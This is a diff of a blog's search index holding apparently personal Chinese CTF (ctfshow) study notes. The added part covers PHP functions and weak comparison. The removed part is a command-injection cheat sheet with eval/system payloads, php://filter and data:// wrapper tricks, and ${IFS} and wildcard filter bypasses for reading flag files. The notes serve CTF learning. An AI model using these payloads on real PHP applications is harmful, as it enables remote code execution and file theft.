+<tr>
+<td>6</td>
+<td><code>&lt; &gt; &lt;= &gt;=</code></td>
+<td>比较大小</td>
+<td><code>$a &lt; $b</code>, <code>$a &gt;= $b</code></td>
+</tr>
+<tr>
+<td>7</td>
+<td><code>== != === !==</code></td>
+<td>相等 &#x2F; 不等 &#x2F; 全等等</td>
+<td><code>$a === $b</code>, <code>$a != $b</code></td>
+</tr>
+<tr>
+<td>8</td>
+<td><code>&amp;</code></td>
+<td>按位与</td>
+<td><code>$a &amp; $b</code></td>
+</tr>
+<tr>
+<td>9</td>
+<td><code>^</code></td>
+<td>按位异或</td>
+<td><code>$a ^ $b</code></td>
+</tr>
+<tr>
+<td>10</td>
+<td>&#96;</td>
+<td>&#96;</td>
+<td>按位或</td>
+</tr>
+<tr>
+<td>11</td>
+<td><code>&amp;&amp;</code></td>
+<td>逻辑与（短路）</td>
+<td><code>$a &amp;&amp; $b</code></td>
+</tr>
+<tr>
+<td>12</td>
+<td>&#96;</td>
+<td></td>
+<td>&#96;</td>
+</tr>
+<tr>
+<td>13</td>
+<td><code>?:</code></td>
+<td>三元运算（条件表达式）</td>
+<td><code>$a ? $b : $c</code></td>
+</tr>
+<tr>
+<td>14</td>
+<td><code>=</code> <code>+=</code> <code>-=</code> 等</td>
+<td>赋值及复合赋值</td>
+<td><code>$a = $b</code>, <code>$a += 1</code></td>
+</tr>
+<tr>
+<td>15</td>
+<td><code>and</code></td>
+<td>逻辑与（低优先）</td>
+<td><code>$a = true and false</code></td>
+</tr>
+<tr>
+<td>16</td>
+<td><code>or</code></td>
+<td>逻辑或（最低优先）</td>
+<td><code>$a = false or true</code></td>
+</tr>
+</tbody></table>
+<h3 id="20-parse-str-函数"><a href="#20-parse-str-函数" class="headerlink" title="20.parse_str()函数:"></a>20.parse_str()函数:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="keyword">string</span> <span class="variable">$string</span>, <span class="keyword">array</span> &amp;<span class="variable">$result</span>): <span class="keyword">void</span></span><br><span class="line">如果 <span class="keyword">string</span> 是 URL 传递入的查询字符串（query <span class="keyword">string</span>），</span><br><span class="line">则将它解析为变量并设置到当前作用域（如果提供了 result 则会设置到该数组里 ）</span><br><span class="line">极度不建议在没有 result 参数的情况下使用此函数， 并且在 PHP <span class="number">7.2</span> 中将废弃不设置参数的行为。</span><br><span class="line">PHP <span class="number">8.0</span>.<span class="number">0</span> 起，result 参数是强制的。</span><br><span class="line">对于<span class="title function_ invoke__">parse_str</span>()，如果传入的是一个数组，例如arr[]=<span class="number">1</span>，则会将变量保存在数组当中arr[<span class="number">0</span>]=<span class="number">1</span>;</span><br></pre></td></tr></table></figure>
+
+<h3 id="21-类"><a href="#21-类" class="headerlink" title="21.类"></a>21.类</h3><h4 id="1-非静态方法-无static"><a href="#1-非静态方法-无static" class="headerlink" title="1.非静态方法(无static)"></a>1.非静态方法(无static)</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">直接<span class="keyword">new</span>一个对象，通过对象来进行调用</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-静态方法-static"><a href="#2-静态方法-static" class="headerlink" title="2.静态方法(static)"></a>2.静态方法(static)</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">静态方法在类ctfshow，限制了不能去<span class="keyword">new</span>，直接::调用即可</span><br></pre></td></tr></table></figure>
+
+<h3 id="22-call-user-func-函数与call-user-func-array-函数类似"><a href="#22-call-user-func-函数与call-user-func-array-函数类似" class="headerlink" title="22.call_user_func()函数与call_user_func_array()函数类似:"></a>22.call_user_func()函数与call_user_func_array()函数类似:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="keyword">callable</span> <span class="variable">$callback</span>, <span class="keyword">mixed</span> ...<span class="variable">$args</span>): <span class="keyword">mixed</span></span><br><span class="line">                 第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。</span><br><span class="line"> --如果传递一个数组，对于类来说，会把数组的第一个元素当作类名，第二个元素当作类的函数</span><br></pre></td></tr></table></figure>
+
+<h3 id="23-PHP-弱类型特性"><a href="#23-PHP-弱类型特性" class="headerlink" title="23.PHP 弱类型特性(&#x3D;&#x3D;)"></a>23.PHP 弱类型特性(&#x3D;&#x3D;)</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PHP 弱比较 == 的转换规则：</span><br><span class="line">   如果一边是数字，另一边是字符串，PHP 会尝试把字符串转换为数字！  </span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>比较类型</th>
+<th>PHP行为</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>数字 vs 字符串</td>
+<td>字符串会被<strong>强制转换为数字</strong>再比较</td>
+</tr>
+<tr>
+<td>字符串 vs 字符串（若一方看起来像数字）</td>
+<td>会尝试<strong>两边都转成数字</strong>再比较</td>
+</tr>
+<tr>
+<td>布尔 vs 任意类型</td>
+<td>会都转成布尔值再比较</td>
+</tr>
+<tr>
+<td>数组&#x2F;对象 vs 标量</td>
+<td>一律为 <code>false</code></td>
+</tr>
+</tbody></table>
+<h3 id="24-create-function-函数"><a href="#24-create-function-函数" class="headerlink" title="24.create_function()函数:"></a>24.create_function()函数:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">函数已自 PHP <span class="number">7.2</span>.<span class="number">0</span> 起被废弃，并自 PHP <span class="number">8.0</span>.<span class="number">0</span> 起被移除。</span><br><span class="line">    <span class="title function_ invoke__">create_function</span>(<span class="keyword">string</span> <span class="variable">$args</span>, <span class="keyword">string</span> <span class="variable">$code</span>): <span class="keyword">string</span>    第一个</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>web学习</category>
+      </categories>
+      <tags>
+        <tag>ctfshow</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>反序列化</title>
     <url>/2025/06/02/ctfshow/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
     <content><![CDATA[<h1 id="常识"><a href="#常识" class="headerlink" title="常识:"></a>常识:</h1><h2 id="1-各类魔术方法"><a href="#1-各类魔术方法" class="headerlink" title="1.各类魔术方法:"></a>1.各类魔术方法:</h2><table>
@@ -2099,124 +2149,6 @@
       </tags>
   </entry>
   <entry>
-    <title>命令执行</title>
-    <url>/2025/06/02/ctfshow/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
-    <content><![CDATA[<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat f*&#x27;</span>);              --通过*通配符来绕过检测</span><br><span class="line">         也可以用cat f???</span><br><span class="line">?c=<span class="keyword">echo</span> `ls`;                     --在Shell 脚本或命令行中，反引号` ` 和 $() 用于执行命令并获取其输出。</span><br><span class="line">            --反引号 是“shell 执行操作符” —— 类似于<span class="title function_ invoke__">shell_exec</span>()`</span><br><span class="line">?c=<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);&amp;<span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;tac flag.php&#x27;</span>);        --<span class="keyword">eval</span>() 会把传入的字符串当成PHP代码执行。</span><br><span class="line">?c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php      --include期望一个字符串形式的文件名或路径。</span></span><br><span class="line">c=data:<span class="comment">//text/plain,&lt;?php system(&quot;cat f*&quot;)?&gt;            --将输入的作为代码执行</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="1-思考："><a href="#1-思考：" class="headerlink" title="1.思考："></a>1.思考：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">通过ls -ld .来查看该目录的权限</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;touch 1.php&#x27;</span>);           --通过touch创建一个文件</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;echo &quot;content&quot; | cat &gt;&gt; 1.php&#x27;</span>);    --通过cat重定向将输入内容写入文件，但是不能理解为什么如果写入内容是一句话木马就写入不了     ---字符转义 一句话马里面的字符会转义 或者闭合，先编码在写入，关键是单引号的转义</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>ls -ld .:</p>
-<p><img src="C:\Users\wanyan\AppData\Roaming\Typora\typora-user-images\image-20250331210855166.png" alt="image-20250331210855166"></p>
-<h3 id="一些绕过"><a href="#一些绕过" class="headerlink" title="一些绕过"></a>一些绕过</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">空格的绕过可以使用%<span class="number">0</span>a代替     --%<span class="number">0</span>a换行符</span><br><span class="line">分号可以用<span class="meta">?&gt;</span>代替</span><br><span class="line">小数点可以用<span class="title function_ invoke__">localeconv</span>()     --函数返回小数点</span><br><span class="line">php中<span class="keyword">include</span>是可以不带括号的函数 ----过滤括号时使用</span><br><span class="line">空格(%<span class="number">20</span>)、制表符(%<span class="number">09</span>)、换行符(%<span class="number">0</span>a)、回车符(%<span class="number">0</span>d)、空字节符(%<span class="number">00</span>)、垂直制表符（%<span class="number">0</span>b），换页符（%<span class="number">0</span>c）</span><br></pre></td></tr></table></figure>
-
-<h4 id="对空格的绕过"><a href="#对空格的绕过" class="headerlink" title="对空格的绕过"></a>对空格的绕过</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$&#123;IFS&#125; 但不能写作 <span class="variable">$IFS</span>       --在 Linux/Bash 中内部字段分隔符，<span class="variable">$IFS</span>默认是空格、Tab、换行。空格可以被 $&#123;IFS&#125; 替代</span><br><span class="line">$IFS$<span class="number">9</span>                 --内部字段分隔符（第一个字符是空格） 第 <span class="number">9</span> 个位置参数（通常为空）</span><br><span class="line">%<span class="number">09</span>                   --URL 编码的 Tab 字符</span><br><span class="line">&lt;&gt;                 </span><br><span class="line">&lt;                      --输入重定向，例如 cat &lt; flag</span><br><span class="line"><span class="variable">$IFS</span>%<span class="number">09</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h3><p>php支持的伪协议：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> file:<span class="comment">// — 访问本地文件系统</span></span><br><span class="line"><span class="number">2</span> http:<span class="comment">// — 访问 HTTP(s) 网址</span></span><br><span class="line">  glob:<span class="comment">//* 是一个 伪协议    ----可以用来绕过open_basedir用于通过 fopen()、file_get_contents() 等函数读取匹配文件的内容</span></span><br><span class="line"><span class="number">3</span> ftp:<span class="comment">// — 访问 FTP(s) URLs</span></span><br><span class="line"><span class="number">4</span> php:<span class="comment">// — 访问各个输入/输出流（I/O streams）</span></span><br><span class="line"><span class="number">5</span> zlib:<span class="comment">// — 压缩流</span></span><br><span class="line"><span class="number">6</span> data:<span class="comment">// — 数据（RFC 2397）       </span></span><br><span class="line"><span class="number">7</span> glob:<span class="comment">// — 查找匹配的文件路径模式</span></span><br><span class="line"><span class="number">8</span> phar:<span class="comment">// — PHP 归档</span></span><br><span class="line"><span class="number">9</span> ssh2:<span class="comment">// — Secure Shell 2</span></span><br><span class="line"><span class="number">10</span> rar:<span class="comment">// — RAR</span></span><br><span class="line"><span class="number">11</span> ogg:<span class="comment">// — 音频流</span></span><br><span class="line"><span class="number">12</span> expect:<span class="comment">// — 处理交互式的流</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="1-flie"><a href="#1-flie" class="headerlink" title="1.flie:&#x2F;&#x2F;"></a>1.flie:&#x2F;&#x2F;</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致 任意文件读取。</span></span><br><span class="line">php:<span class="comment">//filter/read=convert.base64-encode/resource=index.php      --convert.base64-encode，就是一种过滤器</span></span><br><span class="line">php:<span class="comment">//filter/resource=index.php       --没有base64编码，源码可能无法显示(部分字符被浏览器解析)</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="2-data"><a href="#2-data" class="headerlink" title="2.data:&#x2F;&#x2F;"></a>2.data:&#x2F;&#x2F;</h4><p>数据流封装器，以传递相应格式的数据。可以让用户来控制输入流，当它与包含函数结合时，用户输入的data:&#x2F;&#x2F;流会被当作php文件执行。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=<span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=data:<span class="comment">//text/plain,&lt;?php phpinfo();?&gt;   </span></span><br><span class="line">如果要使用:data:<span class="comment">//必须打开    --but这两个是默认关闭</span></span><br><span class="line">allow_url_include=On</span><br><span class="line">allow_url_fopen=On</span><br></pre></td></tr></table></figure>
-
-<h4 id="flie-与data-的区别（include-‘xxx’-include-“xxx”-）"><a href="#flie-与data-的区别（include-‘xxx’-include-“xxx”-）" class="headerlink" title="flie:&#x2F;&#x2F;与data&#x2F;&#x2F;的区别（include ‘xxx’; include(“xxx”);）"></a>flie:&#x2F;&#x2F;与data&#x2F;&#x2F;的区别（include ‘xxx’; include(“xxx”);）</h4><p><img src="C:\Users\wanyan\AppData\Roaming\Typora\typora-user-images\image-20250401164926563.png" alt="image-20250401164926563"></p>
-<h2 id="使用函数拿到flag"><a href="#使用函数拿到flag" class="headerlink" title="使用函数拿到flag"></a>使用函数拿到flag</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">getallheaders</span>()：返回所有的HTTP头信息，返回的是数组而<span class="keyword">eval</span>要求为字符串，所以要用<span class="title function_ invoke__">implode</span>()函数将数组转换为字符串</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">get_defined_vars</span>()：该函数的作用是获取所有的已定义变量，返回值也是数组，不过是二维数组，用<span class="title function_ invoke__">var_dump</span>()输出可以看见输出的内容，看见在第几位之后，可以用<span class="title function_ invoke__">current</span>()函数来获取其值，详细可以看官方函数。</span><br><span class="line">payload：<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">get_defined_vars</span>()));</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_id</span>()：<span class="title function_ invoke__">session_id</span>()可以用来获取/设置当前会话 ID，可以用这个函数来获取cookie中的phpsessionid，并且这个值我们是可控的。</span><br><span class="line">    如可以在cookie中设置 PHPSESSID=<span class="number">706870696e666</span>f28293b，然后用<span class="title function_ invoke__">hex2bin</span>()函数，</span><br><span class="line">    即传入?exp=<span class="keyword">eval</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">session_id</span>(<span class="title function_ invoke__">session_start</span>())));     </span><br><span class="line">    并设置cookie：PHPSESSID=<span class="number">706870696e666</span>f28293b</span><br><span class="line">    session_start 函数是为了开启session</span><br><span class="line">    </span><br><span class="line">配合使用的函数：</span><br><span class="line">	<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(‘.’)); 查看当前目录下的所有文件名</span><br><span class="line">  <span class="title function_ invoke__">var_dump</span>()</span><br><span class="line">	<span class="title function_ invoke__">localeconv</span>() 函数返回一包含本地数字及货币格式信息的数组。   --第一个值为小数点.</span><br><span class="line">	<span class="title function_ invoke__">current</span>() 函数返回数组中的当前元素（单元）,默认取第一个值，pos是current的别名</span><br><span class="line">	<span class="title function_ invoke__">each</span>() 返回数组中当前的键/值对并将数组指针向前移动一步</span><br><span class="line">	<span class="title function_ invoke__">end</span>() 将数组的内部指针指向最后一个单元</span><br><span class="line">	<span class="title function_ invoke__">next</span>() 将数组中的内部指针向前移动一位</span><br><span class="line">	<span class="title function_ invoke__">prev</span>() 将数组中的内部指针倒回一位</span><br><span class="line">	<span class="title function_ invoke__">array_reverse</span>() 以相反的元素顺序返回数组</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="使用函数getallheaders-："><a href="#使用函数getallheaders-：" class="headerlink" title="使用函数getallheaders()："></a>使用函数getallheaders()：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">getallheaders</span>()));构造这个，问题是如果没有 <span class="keyword">eval</span>()，会被当做字符串，而不会被执行</span><br><span class="line">Zzzzzz:<span class="title function_ invoke__">system</span>(<span class="string">&#x27;nl flag.php&#x27;</span>);     ----配合这个使用</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="对使用-或运算得到答案"><a href="#对使用-或运算得到答案" class="headerlink" title="对使用| 或运算得到答案"></a>对使用| 或运算得到答案</h3><p>利用穷举脚本，来通过或运算获得我们想要的字符    —py</p>
-<h2 id="dev-null"><a href="#dev-null" class="headerlink" title="&#x2F;dev&#x2F;null"></a>&#x2F;dev&#x2F;null</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">在类Unix系统中,/dev/<span class="literal">null</span>,或称空设备,是一个特殊的设备文件,它丢弃一切写入其中的数据(但报告写入操作成功)</span><br><span class="line"><span class="number">0</span>   标准输入</span><br><span class="line"><span class="number">1</span>   标准输出</span><br><span class="line"><span class="number">2</span>   错误输出</span><br><span class="line">    </span><br><span class="line"><span class="number">2</span>&gt;/dev/<span class="literal">null</span>   把错误输出到空设备（即丢弃）</span><br><span class="line">&gt;/dev/<span class="literal">null</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span>   相当于<span class="number">1</span>&gt;/dev/<span class="literal">null</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span>   即把标准输出丢弃，并且把错误输出输出到标准输出。合计起来就是错误和标准输出都输出到空设备</span><br><span class="line"><span class="number">2</span>&gt;&amp;<span class="number">1</span> &gt;/dev/<span class="literal">null</span>   错误输出到标准输出，即输出到屏幕上，而标准输出被丢弃</span><br><span class="line">something interesting: 重定向&gt; 和 &gt;&gt;   前者会先清空文件，然后再写入内容，后者会将重定向的内容追加到现有文件的尾部.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">思路一：%<span class="number">0</span>a截断</span><br><span class="line">也就是使两条语句不在一行上执行</span><br><span class="line">c=ls%<span class="number">0</span>a</span><br><span class="line">思路二：管道符的运用</span><br><span class="line">| 直接执行后面的语句</span><br><span class="line">|| 如果前面执行的语句出错，则执行后面的语句</span><br><span class="line">&amp; 如果前面的语句为假则直接执行后面的语句，前面的语句可真可假</span><br><span class="line">&amp;&amp; 如果前面的语句为假则直接出错，不执行后面的语句</span><br><span class="line">; 执行完前面的再执行后面的</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h2 id="使用命令路径"><a href="#使用命令路径" class="headerlink" title="使用命令路径"></a>使用命令路径</h2> <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">bin为<span class="keyword">binary</span>的简写，主要放置一些系统的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等。</span><br><span class="line">我们日常直接使用的cat或者ls等等都其实是简写，例如ls完整全称应该是/bin/ls</span><br><span class="line">base64命令 Encode <span class="keyword">and</span> decode using Base64 representation</span><br><span class="line"></span><br><span class="line">c=/???/????<span class="number">64</span> ????.???      ---base64命令</span><br><span class="line">使用which +命令      ---输出全部的命令路径</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h2 id="source命令的使用"><a href="#source命令的使用" class="headerlink" title="source命令的使用"></a>source命令的使用</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">source命令：</span><br><span class="line">source命令也称为“点命令”，也就是一个点符号（.）。</span><br><span class="line">source命令通常用于重新执行刚修改的初始化文件，使之立即生效，而不必注销并重新登录。</span><br><span class="line">用法： </span><br><span class="line">source filename 或 . filename</span><br></pre></td></tr></table></figure>
-
-<h2 id="仅有-和-时"><a href="#仅有-和-时" class="headerlink" title="仅有$和()时:"></a>仅有$和()时:</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$(()) 代表做一次运算，因为里面为空，也表示值为<span class="number">0</span></span><br><span class="line">$((~$(()))) 对<span class="number">0</span>作取反运算，值为-<span class="number">1</span></span><br><span class="line">$(($((~$(())))$((~$(()))))) -<span class="number">1</span>-<span class="number">1</span>，也就是(-<span class="number">1</span>)+(-<span class="number">1</span>)为-<span class="number">2</span>，所以值为-<span class="number">2</span></span><br><span class="line">$((~$(($((~$(())))$((~$(()))))))) 再对-<span class="number">2</span>做一次取反得到<span class="number">1</span>，所以值为<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;$((&quot;</span> + <span class="string">&quot;$((~$(())))&quot;</span> * <span class="number">37</span> + <span class="string">&quot;))&quot;</span></span><br><span class="line"></span><br><span class="line">    </span><br></pre></td></tr></table></figure>
-
-<h2 id="读取文件函数"><a href="#读取文件函数" class="headerlink" title="读取文件函数"></a>读取文件函数</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">常用读文件函数</span><br><span class="line">    --对读取文件时，必须指定目录,比如当前目录是./</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="variable">$filename</span>);    --字符串<span class="title function_ invoke__">show_source</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">php_strip_whitespace</span>(<span class="variable">$filename</span>));</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>));</span><br><span class="line"><span class="title function_ invoke__">readfile</span>(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// file — 把整个文件读入一个数组中</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">file</span>(<span class="variable">$filename</span>)); </span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file</span>(<span class="variable">$filename</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$filename</span>); <span class="comment">// 非php代码</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="variable">$filename</span>); <span class="comment">// 非php代码</span></span><br><span class="line"><span class="keyword">require</span>(<span class="variable">$filename</span>); <span class="comment">// 非php代码</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="variable">$filename</span>); <span class="comment">// 非php代码</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// fopen去读取文件内容</span></span><br><span class="line"><span class="title function_ invoke__">fread</span>(<span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>,<span class="string">&quot;r&quot;</span>), <span class="variable">$size</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">fread</span>(<span class="title function_ invoke__">popen</span>(<span class="string">&quot;cat flag&quot;</span>, <span class="string">&quot;r&quot;</span>), <span class="variable">$size</span>));</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">fgets</span>(<span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&quot;r&quot;</span>))); <span class="comment">// 读取一行</span></span><br><span class="line"><span class="title function_ invoke__">fpassthru</span>(<span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&quot;r&quot;</span>)); <span class="comment">// 从当前位置一直读取到 EOF</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">fgetcsv</span>(<span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>,<span class="string">&quot;r&quot;</span>), <span class="variable">$size</span>));</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">fgetss</span>(<span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&quot;r&quot;</span>))); <span class="comment">// 从文件指针中读取一行并过滤掉 HTML 标记</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">fscanf</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;r&quot;</span>),<span class="string">&quot;%s&quot;</span>));</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">parse_ini_file</span>(<span class="variable">$filename</span>)); <span class="comment">// 失败时返回 false , 成功返回配置数组</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="查看当前目录文件"><a href="#查看当前目录文件" class="headerlink" title="查看当前目录文件"></a>查看当前目录文件</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;.&#x27;</span>));</span><br><span class="line">c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">dirname</span>(<span class="string">&#x27;__FILE__&#x27;</span>)));</span><br></pre></td></tr></table></figure>
-
-<h3 id="对scandir函数的替换"><a href="#对scandir函数的替换" class="headerlink" title="对scandir函数的替换"></a>对scandir函数的替换</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">glob</span>(<span class="string">&#x27;*&#x27;</span>)     ---用通配符来便利全部文件</span><br><span class="line"><span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="keyword">foreach</span> (<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&#x27;.&#x27;</span>) <span class="keyword">as</span> <span class="variable">$f</span>) <span class="keyword">echo</span> <span class="variable">$f</span>-&gt;<span class="title function_ invoke__">getFilename</span>().<span class="string">&quot;\n&quot;</span>;<span class="keyword">exit</span>(<span class="number">0</span>);<span class="meta">?&gt;</span>    --.可以用glob:<span class="comment">//*这个伪协议</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="与查看相关的函数-–php"><a href="#与查看相关的函数-–php" class="headerlink" title="与查看相关的函数  –php"></a>与查看相关的函数  –php</h3><table>
-<thead>
-<tr>
-<th>函数</th>
-<th>示例</th>
-<th>输出效果</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>var_dump</td>
-<td><code>var_dump($arr);</code></td>
-<td>类型+结构+值</td>
-</tr>
-<tr>
-<td>echo</td>
-<td><code>echo $arr;</code></td>
-<td>报错：数组不能 echo</td>
-</tr>
-<tr>
-<td>json_encode</td>
-<td><code>echo json_encode($arr);</code></td>
-<td><code>&#123;&quot;a&quot;:1,&quot;b&quot;:2&#125;</code></td>
-</tr>
-<tr>
-<td>serialize</td>
-<td><code>echo serialize($arr);</code></td>
-<td><code>a:2:&#123;s:1:&quot;a&quot;;i:1;...&#125;</code></td>
-</tr>
-<tr>
-<td>var_export</td>
-<td><code>var_export($arr);</code></td>
-<td><code>array (&#39;a&#39; =&gt; 1,...)</code></td>
-</tr>
-<tr>
-<td>get_defined_vars</td>
-<td>get_defined_vars()</td>
-<td>返回数组配合var_export函数使用</td>
-</tr>
-</tbody></table>
-<h3 id="对目录的一些操作"><a href="#对目录的一些操作" class="headerlink" title="对目录的一些操作"></a>对目录的一些操作</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">.      --当前目录</span><br><span class="line">..     --上一级目录</span><br><span class="line">../..  --上上级目录</span><br><span class="line">/      --根目录</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h2 id="通过复制或者重命名"><a href="#通过复制或者重命名" class="headerlink" title="通过复制或者重命名"></a>通过复制或者重命名</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">copy</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;flag.txt&quot;</span>);  <span class="comment">// 将文件从 source 拷贝到 dest</span></span><br><span class="line"><span class="title function_ invoke__">rename</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;flag.txt&quot;</span>);  <span class="comment">// 尝试把 oldname 重命名为 newname</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h2 id="如果出现缓冲区代换"><a href="#如果出现缓冲区代换" class="headerlink" title="如果出现缓冲区代换"></a>如果出现缓冲区代换</h2> <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">        <span class="variable">$s</span> = <span class="title function_ invoke__">ob_get_contents</span>();	<span class="comment">// 返回输出缓冲区的内容</span></span><br><span class="line">        <span class="title function_ invoke__">ob_end_clean</span>();	<span class="comment">// 清空（擦除）缓冲区并关闭输出缓冲</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">使用<span class="keyword">exit</span>();提前退出即可</span><br></pre></td></tr></table></figure>
-
-<h2 id="open-basedir的限制"><a href="#open-basedir的限制" class="headerlink" title="open_basedir的限制"></a>open_basedir的限制</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">open_basedir：将PHP所能打开的文件限制在指定的目录树中，包括文件本身。</span><br><span class="line">当程序要使用例如<span class="title function_ invoke__">fopen</span>()或<span class="title function_ invoke__">file_get_contents</span>()打开一个文件时，这个文件的位置将会被检查。当文件在指定的目录树之外，程序将拒绝打开</span><br></pre></td></tr></table></figure>
-
